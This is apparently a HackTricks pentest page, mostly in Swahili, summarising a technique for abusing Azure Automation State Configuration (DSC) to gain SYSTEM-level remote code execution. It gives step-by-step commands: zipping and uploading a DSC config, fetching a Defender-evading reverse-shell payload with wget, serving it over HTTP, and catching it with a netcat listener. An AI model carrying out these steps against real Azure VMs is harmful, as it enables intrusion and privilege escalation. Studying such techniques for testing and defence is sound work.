# Az - State Configuration RCE

{{#include ../../../../banners/hacktricks-training.md}}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Muhtasari wa Maandalizi ya Miundombinu ya Server ya K remote (C2) na Hatua

#### Muonekano

Mchakato unahusisha kuanzisha miundombinu ya server ya mbali ili kuhifadhi payload iliyobadilishwa ya Nishang `Invoke-PowerShellTcp.ps1`, inayoitwa `RevPS.ps1`, iliyoundwa ili kupita Windows Defender. Payload inatolewa kutoka kwa mashine ya Kali Linux yenye IP `40.84.7.74` kwa kutumia seva rahisi ya HTTP ya Python. Operesheni inatekelezwa kupitia hatua kadhaa:

#### Hatua ya 1 — Unda Faili

- **Faili Zinazohitajika:** Skripti mbili za PowerShell zinahitajika:
1. `reverse_shell_config.ps1`: Faili ya Desired State Configuration (DSC) inayopata na kutekeleza payload. Inapatikana kutoka [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Skripti ya kuchapisha usanidi kwa VM, inapatikana kwenye [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).
- **Ubadilishaji:** Vigezo na parameta katika faili hizi lazima zibadilishwe ili kuendana na mazingira maalum ya mtumiaji, ikiwa ni pamoja na majina ya rasilimali, njia za faili, na vitambulisho vya server/payload.

#### Hatua ya 2 — Zip Faili ya Usanidi

- Faili ya `reverse_shell_config.ps1` inashirikiwa katika faili la `.zip`, ikifanya iwe tayari kwa uhamishaji kwenda kwenye Akaunti ya Hifadhi ya Azure.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 — Set Storage Context & Upload

- Faili la usanidi lililoshonwa linawekwa kwenye kontena la Azure Storage lililowekwa awali, azure-pentest, kwa kutumia cmdlet ya Azure Set-AzStorageBlobContent.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 — Prep Kali Box

- Seva ya Kali inapakua mzigo wa RevPS.ps1 kutoka kwenye hifadhi ya GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Skripti imehaririwa ili kubaini VM ya Windows inayolengwa na bandari ya shell ya kurudi.

#### Hatua ya 5 — Chapisha Faili la Mipangilio

- Faili la mipangilio linafanywa kazi, na kusababisha skripti ya shell ya kurudi kupelekwa kwenye eneo lililotajwa kwenye VM ya Windows.

#### Hatua ya 6 — Kuweka Payload na Kuanzisha Listener

- Python SimpleHTTPServer inaanzishwa ili kuhifadhi payload, pamoja na listener ya Netcat kukamata muunganisho unaokuja.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- Kazi iliyoandaliwa inatekeleza mzigo, ikipata haki za kiwango cha SYSTEM.

#### Hitimisho

Utekelezaji wa mafanikio wa mchakato huu unafungua uwezekano mwingi wa hatua zaidi, kama vile kupakua hati au kupanua shambulio kwa VMs nyingi. Mwongozo unahimiza kujifunza zaidi na ubunifu katika eneo la Azure Automation DSC.

{{#include ../../../../banners/hacktricks-training.md}}
